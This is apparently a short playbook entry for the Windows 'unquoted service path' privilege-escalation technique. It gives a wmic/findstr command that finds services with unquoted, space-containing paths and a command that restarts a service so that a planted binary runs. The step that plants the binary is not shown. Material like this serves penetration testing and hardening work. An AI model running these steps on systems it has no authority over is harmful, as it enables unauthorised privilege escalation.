name: Unquoted Service Path Exploitation
description: Abuse missing quotes in service paths to execute arbitrary binary.

steps.name: Find Unquoted Paths
steps.command: wmic service get name,pathname | findstr /i /v /c:"C:\Windows\" | findstr " " | findstr /i /v /c:".exe"
steps.description: List services with spaces and no quotes.

steps.name: Restart Service
steps.command: net stop BadService && net start BadService
